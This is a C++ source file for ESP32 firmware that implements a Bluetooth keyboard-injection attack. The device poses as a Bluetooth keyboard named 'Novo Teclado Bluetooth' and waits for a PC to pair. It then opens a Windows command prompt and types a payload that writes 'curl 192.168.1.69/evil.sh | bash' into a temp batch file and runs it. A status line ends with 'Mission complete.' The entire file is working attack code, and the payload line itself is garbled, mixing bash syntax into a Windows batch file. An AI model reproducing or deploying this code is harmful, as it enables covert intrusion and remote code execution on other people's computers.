#include "ble_keyboard_inject.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "BleKeyboard.h"
#include <NimBLEDevice.h>

// BLE Keyboard Inject implementation
class BLEKeyboardInject {
private:
    BleKeyboard* bleKeyboard = nullptr;
    bool connected = false;

    void setup_ble_keyboard() {
        tft.println("Setting up BLE Keyboard...");
        tft.println("Name: Novo Teclado Bluetooth");

        bleKeyboard = new BleKeyboard("Novo Teclado Bluetooth", "ESP32", 100);
        bleKeyboard->begin();
    }

    void wait_for_connection() {
        tft.println("Waiting for PC to pair...");
        tft.println("Accept 'Novo Teclado Bluetooth' (no PIN required)");

        long start_time = millis();
        while (!bleKeyboard->isConnected() && (millis() - start_time < 30000)) { // 30s timeout
            delay(100);
            tft.print(".");
        }

        if (bleKeyboard->isConnected()) {
            connected = true;
            tft.println("\nConnected! Injecting payload...");
        } else {
            tft.println("\nTimeout - no connection");
        }
    }

    void inject_login_commands() {
        if (!connected) return;

        tft.println("Injecting Ctrl+Alt+Del for login...");

        // Ctrl+Alt+Del for login screen
        bleKeyboard->press(KEY_LEFT_CTRL);
        bleKeyboard->press(KEY_LEFT_ALT);
        bleKeyboard->press(KEY_DELETE);
        delay(100);
        bleKeyboard->releaseAll();

        delay(2000); // Wait for login screen
    }

    void inject_batch_payload() {
        if (!connected) return;

        tft.println("Injecting batch payload...");

        // Open Run dialog (Win+R)
        bleKeyboard->press(KEY_LEFT_GUI);
        bleKeyboard->press('r');
        delay(100);
        bleKeyboard->releaseAll();
        delay(1000);

        // Type cmd and enter
        bleKeyboard->print("cmd");
        delay(500);
        bleKeyboard->press(KEY_RETURN);
        delay(1000);
        bleKeyboard->releaseAll();

        // Type the payload
        String payload = "echo 'curl 192.168.1.69/evil.sh | bash' > %temp%\\.bat && start %temp%\\.bat";
        bleKeyboard->println(payload);

        delay(500);
        bleKeyboard->press(KEY_RETURN);
        delay(100);
        bleKeyboard->releaseAll();

        tft.println("Payload injected!");
    }

    void disconnect_and_cleanup() {
        if (connected) {
            tft.println("Disconnecting...");
            bleKeyboard->end();
            connected = false;
        }

        if (bleKeyboard) {
            delete bleKeyboard;
            bleKeyboard = nullptr;
        }

        tft.println("Gone. Mission complete.");
    }

public:
    void run_injection() {
        setup_ble_keyboard();
        wait_for_connection();

        if (connected) {
            inject_login_commands();
            inject_batch_payload();
            delay(2000); // Let payload execute
        }

        disconnect_and_cleanup();
    }
};

// Global function for BLE Keyboard Inject
void ble_keyboard_inject_attack() {
    BLEKeyboardInject injector;
    injector.run_injection();
}
